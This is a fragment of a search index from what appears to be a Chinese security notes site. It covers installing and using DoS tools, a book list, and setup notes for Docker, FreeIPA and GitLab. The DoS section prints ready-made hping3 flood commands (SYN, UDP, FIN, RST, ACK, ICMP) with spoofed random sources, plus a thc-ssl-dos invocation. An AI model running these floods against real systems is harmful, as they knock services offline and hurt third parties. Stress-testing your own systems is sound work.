--rand-source -F -p PORT IP # \u6d4b\u8bd5TCP RST Flood hping3 --flood --rand-source -R -p PORT IP # \u6d4b\u8bd5PUSH\u548cACK Flood hping3 --flood --rand-source -PA -p PORT IP # \u6d4b\u8bd5ICMP\u548cIGMP Flood hping3 --flood --rand-source -1 -p PORT IP Thc-SSL-DoS thc-ssl-dos\u5b98\u7f51\u5730\u5740 Centos7\u5b89\u88c5Thc-SSL-DoS # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 openssl-devel.x86_64 -y # \u4e0b\u8f7d git clone git://git.kali.org/packages/thc-ssl-dos.git cd thc-ssl-dos # \u7f16\u8bd1\u5b89\u88c5 ./configure make make install thc-ssl-dos\u4f7f\u7528\u6848\u4f8b thc-ssl-dos -l 500 IP PORT --accept","title":"DoS\u4e0eDDoS\u5229\u7528\u5de5\u5177"},{"location":"security_tools/ddos_tools/#dosddos","text":"","title":"DoS\u4e0eDDoS\u5229\u7528\u5de5\u5177"},{"location":"security_tools/ddos_tools/#hping3","text":"hping3\u5b98\u7f51\u5730\u5740","title":"hping3"},{"location":"security_tools/ddos_tools/#centos7hping3","text":"# \u5b89\u88c5\u4f9d\u8d56 yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y # \u4e0b\u8f7d\u5b89\u88c5\u5305 wget http://www.hping.org/hping3-20051105.tar.gz tar -xf hping3-20051105.tar.gz cd hping3-20051105 # \u7f16\u8bd1\u5b89\u88c5 ./configure # \u6b64\u65f6\u62a5\u9519\u5982\u4e0b # \u4fee\u6539\u6587\u4ef6\uff0c\u4fee\u6539\u5185\u5bb9\u5982\u56fe vim bytesex.h # \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u91cd\u65b0\u7f16\u8bd1 ./configure make # \u6b64\u65f6\u62a5\u9519\u5982\u4e0b # \u89e3\u51b3\u65b9\u6848 ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h # \u5b8c\u6210\u4ee5\u540e\u518d\u6b21\u5b89\u88c5 make make install","title":"Centos7\u5b89\u88c5hping3"},{"location":"security_tools/ddos_tools/#hping3_1","text":"# \u6d4b\u8bd5SYN Flood hping3 -S --flood -V -p PORT IP hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # \u968f\u673a\u6e90IP # \u6d4b\u8bd5UDP Flood hping3 --flood --rand-source --udp -p PORT IP # \u6d4b\u8bd5TCP FIN Flood hping3 --flood --rand-source -F -p PORT IP # \u6d4b\u8bd5TCP RST Flood hping3 --flood --rand-source -R -p PORT IP # \u6d4b\u8bd5PUSH\u548cACK Flood hping3 --flood --rand-source -PA -p PORT IP # \u6d4b\u8bd5ICMP\u548cIGMP Flood hping3 --flood --rand-source -1 -p PORT IP","title":"hping3\u4f7f\u7528\u6848\u4f8b"},{"location":"security_tools/ddos_tools/#thc-ssl-dos","text":"thc-ssl-dos\u5b98\u7f51\u5730\u5740","title":"Thc-SSL-DoS"},{"location":"security_tools/ddos_tools/#centos7thc-ssl-dos","text":"# \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 openssl-devel.x86_64 -y # \u4e0b\u8f7d git clone git://git.kali.org/packages/thc-ssl-dos.git cd thc-ssl-dos # \u7f16\u8bd1\u5b89\u88c5 ./configure make make install","title":"Centos7\u5b89\u88c5Thc-SSL-DoS"},{"location":"security_tools/ddos_tools/#thc-ssl-dos_1","text":"thc-ssl-dos -l 500 IP PORT --accept","title":"thc-ssl-dos\u4f7f\u7528\u6848\u4f8b"},{"location":"study_notes/books/","text":"\u4e66\u5355\u63a8\u8350(\u4e0d\u5149\u5b89\u5168) \u4ee3\u7801\u5ba1\u8ba1 \u4f01\u4e1a\u7ea7Web\u4ee3\u7801\u5b89\u5168\u67b6\u6784 \u4e92\u8054\u7f51\u4f01\u4e1a\u5b89\u5168\u9ad8\u7ea7\u6307\u5357 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u5165\u95e8 \u57fa\u4e8e\u5f00\u4e1a\u8f6f\u4ef6\u6253\u9020\u4f01\u4e1a\u7f51\u7edc\u5b89\u5168 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u6307\u5357 \u91d1\u878d\u884c\u4e1a\u5b89\u5168\u67b6\u6784\u4e0e\u6280\u672f\u5b9e\u8df5 \u8f6f\u4ef6\u5b9a\u4e49\u5b89\u5168 SDN/NFV\u65b0\u578b\u7f51\u7edc\u7684\u5b89\u5168\u63ed\u79d8 \u94f6\u884c\u4fe1\u606f\u5b89\u5168\u6280\u672f\u4e0e\u7ba1\u7406\u4f53\u7cfb \u767d\u5e3d\u5b50\u8bb2\u6d4f\u89c8\u5668\u5b89\u5168 \u767d\u5e3d\u5b50\u8bb2Web\u5b89\u5168 \u6076\u610f\u8f6f\u4ef6 Rootkit\u4e0e\u50f5\u5c38\u7f51\u7edc \u53cd\u6b3a\u9a97\u7684\u827a\u672f \u4e16\u754c\u4f20\u5947\u9ed1\u5ba2\u7684\u7ecf\u5386\u5206\u4eab \u53cd\u5165\u4fb5\u7684\u827a\u672f \u9ed1\u5ba2\u5165\u4fb5\u80cc\u540e\u7684\u771f\u5b9e\u6545\u4e8b \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 \u6d4f\u89c8\u5668\u5b9e\u6218\u7bc7 \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 IOS\u7bc7 \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 Web\u5b9e\u6218\u7bc7 \u9ed1\u5ba2\u4e0e\u753b\u5bb6 \u6f0f\u6d1e\u6218\u4e89 \u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406 \u7834\u574f\u4e4b\u738b DDoS\u653b\u51fb\u4e0e\u9632\u8303\u6df1\u5ea6\u5256\u6790 \u8bf7\u541b\u5165\u74ee APT\u653b\u9632\u6307\u5357\u4e4b\u5175\u4e0d\u538c\u8bc8 \u793e\u4f1a\u5de5\u7a0b \u5b89\u5168\u4f53\u7cfb\u4e2d\u7684\u4eba\u6027\u6f0f\u6d1e \u6709\u8da3\u7684\u4e8c\u8fdb\u5236 \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Android\u5b89\u5168\u653b\u9632\u6743\u5a01\u6307\u5357 Android\u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Fiddler\u8c03\u8bd5\u6743\u5a01\u6307\u5357 IOS\u5e94\u7528\u5b89\u5168\u6743\u5a01\u6307\u5357 macOS\u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Metasploit\u6e17\u900f\u6d4b\u8bd5\u9b54\u9b3c\u8bad\u7ec3\u8425 SQL\u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1(\u7b2c\u4e8c\u7248) XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u5256\u6790\u4e0e\u9632\u5fa1 Web\u5b89\u5168\u6df1\u5ea6\u5256\u6790 Web\u653b\u9632\u4e4b\u4e1a\u52a1\u5b89\u5168\u5b9e\u6218\u6307\u5357 Web\u524d\u7aef\u9ed1\u5ba2\u6280\u672f\u63ed\u79d8 \u5f00\u6e90\u5b89\u5168\u8fd0\u7ef4\u5e73\u53f0 OSSIM\u6700\u4f73\u5b9e\u8df5 \u65e5\u5fd7\u7ba1\u7406\u4e0e\u5206\u6790\u6743\u5a01\u6307\u5357 \u6570\u636e\u6316\u6398\uff1a\u6982\u5ff5\u4e0e\u6280\u672f \u7f51\u7edc\u5b89\u5168\u76d1\u63a7 \u6536\u96c6\u3001\u68c0\u6d4b\u548c\u5206\u6790 Python\u6570\u636e\u5206\u6790\u4e0e\u6316\u6398\u5b9e\u8df5 UNIX/Linux\u7f51\u7edc\u65e5\u5fd7\u5206\u6790\u4e0e\u6d41\u91cf\u76d1\u63a7 \u673a\u5668\u5b66\u4e60 \u4f01\u4e1a\u5927\u6570\u636e\u5904\u7406Spark\u3001Druid\u3001Flume\u4e0eKafka\u5e94\u7528\u5b9e\u6218 Hadoop\u6743\u5a01\u6307\u5357(\u7b2c\u56db\u7248) Hadoop\u6784\u5efa\u6570\u636e\u4ed3\u5e93\u5b9e\u8df5 Hadoop\u5b89\u5168\u5927\u6570\u636e\u5e73\u53f0\u9690\u79c1\u4fdd\u62a4 Spark\u5feb\u901f\u5927\u6570\u636e\u5206\u6790 Spark\u9ad8\u7ea7\u6570\u636e\u5206\u6790(\u7b2c\u4e8c\u7248) Web\u5b89\u5168\u4e4b\u673a\u5668\u5b66\u4e60\u5165\u95e8 Web\u5b89\u5168\u4e4b\u6df1\u5ea6\u5b66\u4e60\u5b9e\u6218 Web\u5b89\u5168\u4e4b\u5f3a\u5316\u5b66\u4e60\u4e0eGAN Python\u7edd\u6280 \u8fd0\u7528Python\u6210\u4e3a\u9876\u7ea7\u9ed1\u5ba2 Python\u9ed1\u5e3d\u5b50 \u9ed1\u5ba2\u4e0e\u6e17\u900f\u6d4b\u8bd5\u7f16\u7a0b\u4e4b\u9053 Python\u7f51\u7edc\u7f16\u7a0b\u57fa\u7840(\u7b2c\u4e8c\u7248) CISSP\u6743\u5a01\u6307\u5357 Docker\u6280\u672f\u5165\u95e8\u4e0e\u5b9e\u8df5 Linux\u7cfb\u7edf\u547d\u4ee4\u53caShell\u811a\u672c\u5b9e\u8df5\u6307\u5357 SQL\u5fc5\u77e5\u5fc5\u4f1a SRE Google\u8fd0\u7ef4\u89e3\u5bc6 TCP/IP\u8be6\u89e3 Wireshark\u6570\u636e\u5305\u5206\u6790\u5b9e\u6218","title":"\u4e66\u5355\u63a8\u8350(\u4e0d\u5149\u5b89\u5168)"},{"location":"study_notes/books/#_1","text":"\u4ee3\u7801\u5ba1\u8ba1 \u4f01\u4e1a\u7ea7Web\u4ee3\u7801\u5b89\u5168\u67b6\u6784 \u4e92\u8054\u7f51\u4f01\u4e1a\u5b89\u5168\u9ad8\u7ea7\u6307\u5357 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u5165\u95e8 \u57fa\u4e8e\u5f00\u4e1a\u8f6f\u4ef6\u6253\u9020\u4f01\u4e1a\u7f51\u7edc\u5b89\u5168 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u6307\u5357 \u91d1\u878d\u884c\u4e1a\u5b89\u5168\u67b6\u6784\u4e0e\u6280\u672f\u5b9e\u8df5 \u8f6f\u4ef6\u5b9a\u4e49\u5b89\u5168 SDN/NFV\u65b0\u578b\u7f51\u7edc\u7684\u5b89\u5168\u63ed\u79d8 \u94f6\u884c\u4fe1\u606f\u5b89\u5168\u6280\u672f\u4e0e\u7ba1\u7406\u4f53\u7cfb \u767d\u5e3d\u5b50\u8bb2\u6d4f\u89c8\u5668\u5b89\u5168 \u767d\u5e3d\u5b50\u8bb2Web\u5b89\u5168 \u6076\u610f\u8f6f\u4ef6 Rootkit\u4e0e\u50f5\u5c38\u7f51\u7edc \u53cd\u6b3a\u9a97\u7684\u827a\u672f \u4e16\u754c\u4f20\u5947\u9ed1\u5ba2\u7684\u7ecf\u5386\u5206\u4eab \u53cd\u5165\u4fb5\u7684\u827a\u672f \u9ed1\u5ba2\u5165\u4fb5\u80cc\u540e\u7684\u771f\u5b9e\u6545\u4e8b \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 \u6d4f\u89c8\u5668\u5b9e\u6218\u7bc7 \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 IOS\u7bc7 \u9ed1\u5ba2\u653b\u9632\u5b9d\u5178 Web\u5b9e\u6218\u7bc7 \u9ed1\u5ba2\u4e0e\u753b\u5bb6 \u6f0f\u6d1e\u6218\u4e89 \u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406 \u7834\u574f\u4e4b\u738b DDoS\u653b\u51fb\u4e0e\u9632\u8303\u6df1\u5ea6\u5256\u6790 \u8bf7\u541b\u5165\u74ee APT\u653b\u9632\u6307\u5357\u4e4b\u5175\u4e0d\u538c\u8bc8 \u793e\u4f1a\u5de5\u7a0b \u5b89\u5168\u4f53\u7cfb\u4e2d\u7684\u4eba\u6027\u6f0f\u6d1e \u6709\u8da3\u7684\u4e8c\u8fdb\u5236 \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Android\u5b89\u5168\u653b\u9632\u6743\u5a01\u6307\u5357 Android\u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Fiddler\u8c03\u8bd5\u6743\u5a01\u6307\u5357 IOS\u5e94\u7528\u5b89\u5168\u6743\u5a01\u6307\u5357 macOS\u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 Metasploit\u6e17\u900f\u6d4b\u8bd5\u9b54\u9b3c\u8bad\u7ec3\u8425 SQL\u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1(\u7b2c\u4e8c\u7248) XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u5256\u6790\u4e0e\u9632\u5fa1 Web\u5b89\u5168\u6df1\u5ea6\u5256\u6790 Web\u653b\u9632\u4e4b\u4e1a\u52a1\u5b89\u5168\u5b9e\u6218\u6307\u5357 Web\u524d\u7aef\u9ed1\u5ba2\u6280\u672f\u63ed\u79d8 \u5f00\u6e90\u5b89\u5168\u8fd0\u7ef4\u5e73\u53f0 OSSIM\u6700\u4f73\u5b9e\u8df5 \u65e5\u5fd7\u7ba1\u7406\u4e0e\u5206\u6790\u6743\u5a01\u6307\u5357 \u6570\u636e\u6316\u6398\uff1a\u6982\u5ff5\u4e0e\u6280\u672f \u7f51\u7edc\u5b89\u5168\u76d1\u63a7 \u6536\u96c6\u3001\u68c0\u6d4b\u548c\u5206\u6790 Python\u6570\u636e\u5206\u6790\u4e0e\u6316\u6398\u5b9e\u8df5 UNIX/Linux\u7f51\u7edc\u65e5\u5fd7\u5206\u6790\u4e0e\u6d41\u91cf\u76d1\u63a7 \u673a\u5668\u5b66\u4e60 \u4f01\u4e1a\u5927\u6570\u636e\u5904\u7406Spark\u3001Druid\u3001Flume\u4e0eKafka\u5e94\u7528\u5b9e\u6218 Hadoop\u6743\u5a01\u6307\u5357(\u7b2c\u56db\u7248) Hadoop\u6784\u5efa\u6570\u636e\u4ed3\u5e93\u5b9e\u8df5 Hadoop\u5b89\u5168\u5927\u6570\u636e\u5e73\u53f0\u9690\u79c1\u4fdd\u62a4 Spark\u5feb\u901f\u5927\u6570\u636e\u5206\u6790 Spark\u9ad8\u7ea7\u6570\u636e\u5206\u6790(\u7b2c\u4e8c\u7248) Web\u5b89\u5168\u4e4b\u673a\u5668\u5b66\u4e60\u5165\u95e8 Web\u5b89\u5168\u4e4b\u6df1\u5ea6\u5b66\u4e60\u5b9e\u6218 Web\u5b89\u5168\u4e4b\u5f3a\u5316\u5b66\u4e60\u4e0eGAN Python\u7edd\u6280 \u8fd0\u7528Python\u6210\u4e3a\u9876\u7ea7\u9ed1\u5ba2 Python\u9ed1\u5e3d\u5b50 \u9ed1\u5ba2\u4e0e\u6e17\u900f\u6d4b\u8bd5\u7f16\u7a0b\u4e4b\u9053 Python\u7f51\u7edc\u7f16\u7a0b\u57fa\u7840(\u7b2c\u4e8c\u7248) CISSP\u6743\u5a01\u6307\u5357 Docker\u6280\u672f\u5165\u95e8\u4e0e\u5b9e\u8df5 Linux\u7cfb\u7edf\u547d\u4ee4\u53caShell\u811a\u672c\u5b9e\u8df5\u6307\u5357 SQL\u5fc5\u77e5\u5fc5\u4f1a SRE Google\u8fd0\u7ef4\u89e3\u5bc6 TCP/IP\u8be6\u89e3 Wireshark\u6570\u636e\u5305\u5206\u6790\u5b9e\u6218","title":"\u4e66\u5355\u63a8\u8350(\u4e0d\u5149\u5b89\u5168)"},{"location":"study_notes/docker/","text":"Docker\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eDocker \u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u4f7f\u7528\u963f\u91cc\u4e91\u955c\u50cf\u5b89\u88c5 wget http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo # \u5b89\u88c5Docker yum install docker-ce.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl enable docker.service systemctl start docker.service # \u67e5\u770b\u7248\u672c\u4fe1\u606f docker --version Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eDocker-Compose # \u4e0b\u8f7ddocker-compose curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-Linux-x86_64 mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose # \u7ed9docker-compose\u6dfb\u52a0\u6267\u884c\u6743\u9650 chmod +x /usr/local/bin/docker-compose Docker\u4f7f\u7528\u547d\u4ee4 \u5907\u6ce8 \u547d\u4ee4 \u67e5\u770b\u5e2e\u52a9 docker help \u67e5\u770b\u7248\u672c\u4e0e\u7cfb\u7edf\u4fe1\u606f docker version \u6216 docker info \u67e5\u627e\u955c\u50cf docker search redis \u83b7\u53d6\u955c\u50cf docker pull nginx[:tag] \u67e5\u770b\u672c\u5730\u955c\u50cf\u4fe1\u606f docker images \u67e5\u770b\u955c\u50cf\u5386\u53f2 docker history nginx:latest \u6dfb\u52a0\u955c\u50cf\u6807\u7b7e docker tag name:tag name:tag \u5220\u9664\u955c\u50cf docker rmi name:tag \u521b\u5efa\u5bb9\u5668 docker run -d redis \u521b\u5efa\u5bb9\u5668\u65f6\u547d\u540d\u4e14\u6620\u5c04\u7aef\u53e3 docker run -d --name nginx -p 8080:80 nginx \u67e5\u770b\u7ed1\u5b9a\u7684\u968f\u673a\u7aef\u53e3 docker run -d --name container_name -p 6379 redis:latest \u6302\u8f7d\u76ee\u5f55 docker run -d --name redcontainer_name ismapped -v /opt/docker/data/redis:/data redis \u67e5\u770b\u5bb9\u5668 docker ps \u6216 docker ps -a \u505c\u6b62\u5bb9\u5668 docker stop container_name \u68c0\u67e5\u5bb9\u5668 docker inspect container_id \u6267\u884c\u547d\u4ee4 docker run nginx ps \u6216 docker run -it nginx bash \u67e5\u770b\u65e5\u5fd7 docker logs container_id \u590d\u5236\u6587\u4ef6 docker cp source_file container_name:PATH \u521b\u5efa\u955c\u50cf docker commit container_id image_name","title":"Docker\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/docker/#docker","text":"","title":"Docker\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/docker/#centos7docker","text":"\u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u4f7f\u7528\u963f\u91cc\u4e91\u955c\u50cf\u5b89\u88c5 wget http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo # \u5b89\u88c5Docker yum install docker-ce.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl enable docker.service systemctl start docker.service # \u67e5\u770b\u7248\u672c\u4fe1\u606f docker --version","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eDocker"},{"location":"study_notes/docker/#centos7docker-compose","text":"# \u4e0b\u8f7ddocker-compose curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-Linux-x86_64 mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose # \u7ed9docker-compose\u6dfb\u52a0\u6267\u884c\u6743\u9650 chmod +x /usr/local/bin/docker-compose","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eDocker-Compose"},{"location":"study_notes/docker/#docker_1","text":"\u5907\u6ce8 \u547d\u4ee4 \u67e5\u770b\u5e2e\u52a9 docker help \u67e5\u770b\u7248\u672c\u4e0e\u7cfb\u7edf\u4fe1\u606f docker version \u6216 docker info \u67e5\u627e\u955c\u50cf docker search redis \u83b7\u53d6\u955c\u50cf docker pull nginx[:tag] \u67e5\u770b\u672c\u5730\u955c\u50cf\u4fe1\u606f docker images \u67e5\u770b\u955c\u50cf\u5386\u53f2 docker history nginx:latest \u6dfb\u52a0\u955c\u50cf\u6807\u7b7e docker tag name:tag name:tag \u5220\u9664\u955c\u50cf docker rmi name:tag \u521b\u5efa\u5bb9\u5668 docker run -d redis \u521b\u5efa\u5bb9\u5668\u65f6\u547d\u540d\u4e14\u6620\u5c04\u7aef\u53e3 docker run -d --name nginx -p 8080:80 nginx \u67e5\u770b\u7ed1\u5b9a\u7684\u968f\u673a\u7aef\u53e3 docker run -d --name container_name -p 6379 redis:latest \u6302\u8f7d\u76ee\u5f55 docker run -d --name redcontainer_name ismapped -v /opt/docker/data/redis:/data redis \u67e5\u770b\u5bb9\u5668 docker ps \u6216 docker ps -a \u505c\u6b62\u5bb9\u5668 docker stop container_name \u68c0\u67e5\u5bb9\u5668 docker inspect container_id \u6267\u884c\u547d\u4ee4 docker run nginx ps \u6216 docker run -it nginx bash \u67e5\u770b\u65e5\u5fd7 docker logs container_id \u590d\u5236\u6587\u4ef6 docker cp source_file container_name:PATH \u521b\u5efa\u955c\u50cf docker commit container_id image_name","title":"Docker\u4f7f\u7528\u547d\u4ee4"},{"location":"study_notes/freeipa/","text":"FreeIPA\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1 \u5b98\u7f51\u5730\u5740 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eFreeIPA # \u914d\u7f6edns\u89e3\u6790\u8bb0\u5f55 echo 10.10.10.14 ipa.bloodzer0.com ipa /etc/hosts echo ipa.bloodzer0.com /etc/hostname # \u5b89\u88c5ipa-server yum install ipa-server.x86_64 ipa-server-dns.noarch -y \u914d\u7f6eipa-server ipa-server-install # \u662f\u5426\u96c6\u6210DNS # \u914d\u7f6ehostname # \u786e\u8ba4\u57df\u540d # \u63d0\u4f9b\u4e00\u4e2a\u540d\u5b57 # \u8f93\u5165\u5bc6\u7801 password1 # \u786e\u8ba4\u5bc6\u7801 # ipa admin\u5bc6\u7801 password2 # \u786e\u8ba4\u5bc6\u7801 # \u914d\u7f6eDNS\u8f6c\u53d1 # \u662f\u5426\u4f7f\u7528\u672c\u673a\u4f5c\u4e3aDNS\u8f6c\u53d1 # enter\u8df3\u8fc7 # \u914d\u7f6e\u57df \u8bbf\u95ee\u6d4b\u8bd5ipa-server # \u8bbf\u95eehttps://ipa.bloodzer0.com # \u5916\u90e8\u8bbf\u95ee\uff0c\u9700\u8981\u6dfb\u52a0hosts\u6587\u4ef6\u89e3\u6790 # \u8d26\u53f7\uff1aadmin \u5bc6\u7801\uff1apassword2 \u4f7f\u7528FreeIPA \u5e38\u7528\u547d\u4ee4 \u5907\u6ce8 \u547d\u4ee4 \u67e5\u770b\u914d\u7f6e\u4fe1\u606f ldapsearch -H ldap://ipa.bloodzer0.com -x -D 'cn=Directory Manager' -W -LLL -Z '(uid=admin)' \uff08\u5bc6\u7801\uff1apassword1\uff09 \u8e29\u5751\u8bb0\u5f55 \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u62a5\u9519 \u63d0\u793a\u5185\u5bb9 [error] CalledProcessError: Command '/bin/systemctl start certmonger.service' returned non-zero exit status 1 \u89e3\u51b3\u65b9\u6848 # \u5728yum install ipa-server.x86_64 ipa-server-dns.noarch -y\u8fd9\u4e00\u6b65\u540e\u6267\u884c\u5982\u4e0b\u64cd\u4f5c systemctl restart dbus.service","title":"FreeIPA\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1"},{"location":"study_notes/freeipa/#freeipa","text":"\u5b98\u7f51\u5730\u5740","title":"FreeIPA\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1"},{"location":"study_notes/freeipa/#centos7freeipa","text":"# \u914d\u7f6edns\u89e3\u6790\u8bb0\u5f55 echo 10.10.10.14 ipa.bloodzer0.com ipa /etc/hosts echo ipa.bloodzer0.com /etc/hostname # \u5b89\u88c5ipa-server yum install ipa-server.x86_64 ipa-server-dns.noarch -y","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eFreeIPA"},{"location":"study_notes/freeipa/#ipa-server","text":"ipa-server-install # \u662f\u5426\u96c6\u6210DNS # \u914d\u7f6ehostname # \u786e\u8ba4\u57df\u540d # \u63d0\u4f9b\u4e00\u4e2a\u540d\u5b57 # \u8f93\u5165\u5bc6\u7801 password1 # \u786e\u8ba4\u5bc6\u7801 # ipa admin\u5bc6\u7801 password2 # \u786e\u8ba4\u5bc6\u7801 # \u914d\u7f6eDNS\u8f6c\u53d1 # \u662f\u5426\u4f7f\u7528\u672c\u673a\u4f5c\u4e3aDNS\u8f6c\u53d1 # enter\u8df3\u8fc7 # \u914d\u7f6e\u57df","title":"\u914d\u7f6eipa-server"},{"location":"study_notes/freeipa/#ipa-server_1","text":"# \u8bbf\u95eehttps://ipa.bloodzer0.com # \u5916\u90e8\u8bbf\u95ee\uff0c\u9700\u8981\u6dfb\u52a0hosts\u6587\u4ef6\u89e3\u6790 # \u8d26\u53f7\uff1aadmin \u5bc6\u7801\uff1apassword2","title":"\u8bbf\u95ee\u6d4b\u8bd5ipa-server"},{"location":"study_notes/freeipa/#freeipa_1","text":"","title":"\u4f7f\u7528FreeIPA"},{"location":"study_notes/freeipa/#_1","text":"\u5907\u6ce8 \u547d\u4ee4 \u67e5\u770b\u914d\u7f6e\u4fe1\u606f ldapsearch -H ldap://ipa.bloodzer0.com -x -D 'cn=Directory Manager' -W -LLL -Z '(uid=admin)' \uff08\u5bc6\u7801\uff1apassword1\uff09","title":"\u5e38\u7528\u547d\u4ee4"},{"location":"study_notes/freeipa/#_2","text":"","title":"\u8e29\u5751\u8bb0\u5f55"},{"location":"study_notes/freeipa/#_3","text":"\u63d0\u793a\u5185\u5bb9 [error] CalledProcessError: Command '/bin/systemctl start certmonger.service' returned non-zero exit status 1 \u89e3\u51b3\u65b9\u6848 # \u5728yum install ipa-server.x86_64 ipa-server-dns.noarch -y\u8fd9\u4e00\u6b65\u540e\u6267\u884c\u5982\u4e0b\u64cd\u4f5c systemctl restart dbus.service","title":"\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u62a5\u9519"},{"location":"study_notes/gitlab/","text":"Gitlab\u4ed3\u5e93\u7ba1\u7406\u5de5\u5177 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eGitlab # \u89e3\u51b3\u4f9d\u8d56 yum install policycoreutils-python.x86_64 openssh-server.x86_64 -y # \u5b89\u88c5\u90ae\u4ef6\u670d\u52a1 yum install postfix.x86_64 -y # \u6dfb\u52a0\u793e\u533a\u7248package curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | bash # \u5b89\u88c5\u793e\u533a\u7248gitlab yum install gitlab-ce.x86_64 -y # \u914d\u7f6egitlab\u7ad9\u70b9url\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528ip\u66ff\u4ee3 vim /etc/gitlab/gitlab.rb # external_url http://10.10.10.14 # \u542f\u52a8gitlab gitlab-ctl reconfigure # \u8d26\u53f7\uff1aroot \u5bc6\u7801\uff1aADMIN@110 \u5982\u679c\u56fd\u5916\u7684\u6e90\u592a\u6162\u53ef\u4ee5\u4f7f\u7528\u6e05\u534e\u5927\u5b66\u7684\u6e90\uff1ahttps://mirror.tuna.tsinghua.edu.cn/help/gitlab-ce/ \u8e29\u5751\u8bb0\u5f55 \u7aef\u53e3\u88ab\u5360\u7528 \u5982\u679c8080\u7aef\u53e3\u88ab\u5360\u7528\uff0c\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff1avim /etc/gitlab/gitlab.rb unicorn['listen'] = 'localhost' # unicorn['port'] = 8080 unicorn['port'] = 8082 \u4fee\u6539\u76d1\u542c\u6587\u4ef6\uff1avim /var/opt/gitlab/gitlab-rails/etc/unicorn.rb # listen 127.0.0.1:8080 , :tcp_nopush = true listen 127.0.0.1:8082 , :tcp_nopush = true \u91cd\u542f\u670d\u52a1\uff1agitlab-ctl restart Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eGitlab-Runner # \u6dfb\u52a0package curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh | bash # \u5b89\u88c5 yum install gitlab-runner.x86_64 -y \u6e05\u534e\u5927\u5b66\u7b49\u6e90\uff1ahttps://mirror.tuna.tsinghua.edu.cn/help/gitlab-runner/ Gitlab-Runner\u4f7f\u7528 \u6ce8\u518crunner\uff1a\u5728gitlab\u9879\u76ee\u7684 settings \u4e2d\u627e\u5230 CI/CD \uff0c\u6253\u5f00 Runner \uff0c\u627e\u5230 Set up specific Runner manually gitlab-runner register \u53c2\u8003\u8d44\u6599 \u5b89\u88c5\u8c03\u8bd5gitlab/gitlab-ce\u5bb9\u5668\u65f6\u9047\u5230\u7684502","title":"Gitlab\u4ed3\u5e93\u7ba1\u7406\u5de5\u5177"},{"location":"study_notes/gitlab/#gitlab","text":"","title":"Gitlab\u4ed3\u5e93\u7ba1\u7406\u5de5\u5177"},{"location":"study_notes/gitlab/#centos7gitlab","text":"# \u89e3\u51b3\u4f9d\u8d56 yum install policycoreutils-python.x86_64 openssh-server.x86_64 -y # \u5b89\u88c5\u90ae\u4ef6\u670d\u52a1 yum install postfix.x86_64 -y # \u6dfb\u52a0\u793e\u533a\u7248package curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | bash # \u5b89\u88c5\u793e\u533a\u7248gitlab yum install gitlab-ce.x86_64 -y # \u914d\u7f6egitlab\u7ad9\u70b9url\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528ip\u66ff\u4ee3 vim /etc/gitlab/gitlab.rb # external_url http://10.10.10.14 # \u542f\u52a8gitlab gitlab-ctl reconfigure # \u8d26\u53f7\uff1aroot 